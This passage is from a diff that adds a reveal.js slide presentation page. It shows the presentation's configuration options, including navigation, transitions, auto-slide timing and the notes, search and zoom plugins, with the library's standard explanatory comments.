+        history: false,
+
+        // Enable keyboard shortcuts for navigation
+        keyboard: true,
+
+        // Enable the slide overview mode
+        overview: true,
+
+        // Disables the default reveal.js slide layout (scaling and centering)
+        // so that you can use custom CSS layout
+        disableLayout: false,
+
+        // Vertical centering of slides
+        center: true,
+
+        // Enables touch navigation on devices with touch input
+        touch: true,
+
+        // Loop the presentation
+        loop: false,
+
+        // Change the presentation direction to be RTL
+        rtl: false,
+
+        // see https://revealjs.com/vertical-slides/#navigation-mode
+        navigationMode: 'default',
+
+        // Randomizes the order of slides each time the presentation loads
+        shuffle: false,
+
+        // Turns fragments on and off globally
+        fragments: true,
+
+        // Flags whether to include the current fragment in the URL,
+        // so that reloading brings you to the same fragment position
+        fragmentInURL: true,
+
+        // Flags if the presentation is running in an embedded mode,
+        // i.e. contained within a limited portion of the screen
+        embedded: false,
+
+        // Flags if we should show a help overlay when the questionmark
+        // key is pressed
+        help: true,
+
+        // Flags if it should be possible to pause the presentation (blackout)
+        pause: true,
+
+        // Flags if speaker notes should be visible to all viewers
+        showNotes: false,
+
+        // Global override for autoplaying embedded media (null/true/false)
+        autoPlayMedia: null,
+
+        // Global override for preloading lazy-loaded iframes (null/true/false)
+        preloadIframes: null,
+
+        // Number of milliseconds between automatically proceeding to the
+        // next slide, disabled when set to 0, this value can be overwritten
+        // by using a data-autoslide attribute on your slides
+        autoSlide: 0,
+
+        // Stop auto-sliding after user input
+        autoSlideStoppable: true,
+
+        // Use this method for navigation when auto-sliding
+        autoSlideMethod: null,
+
+        // Specify the average time in seconds that you think you will spend
+        // presenting each slide. This is used to show a pacing timer in the
+        // speaker view
+        defaultTiming: null,
+
+        // Enable slide navigation via mouse wheel
+        mouseWheel: false,
+
+        // The display mode that will be used to show slides
+        display: 'block',
+
+        // Hide cursor if inactive
+        hideInactiveCursor: true,
+
+        // Time before the cursor is hidden (in ms)
+        hideCursorTime: 5000,
+
+        // Opens links in an iframe preview overlay
+        previewLinks: false,
+
+        // Transition style (none/fade/slide/convex/concave/zoom)
+        transition: 'slide',
+
+        // Transition speed (default/fast/slow)
+        transitionSpeed: 'default',
+
+        // Transition style for full page slide backgrounds
+        // (none/fade/slide/convex/concave/zoom)
+        backgroundTransition: 'fade',
+
+        // Number of slides away from the current that are visible
+        viewDistance: 3,
+
+        // Number of slides away from the current that are visible on mobile
+        // devices. It is advisable to set this to a lower number than
+        // viewDistance in order to save resources.
+        mobileViewDistance: 2,
+
+        // reveal.js plugins
+        plugins: [
+          RevealNotes,
+          RevealSearch,
+          RevealZoom
+        ]
+      });
+    </script>
+    </body>
+</html>
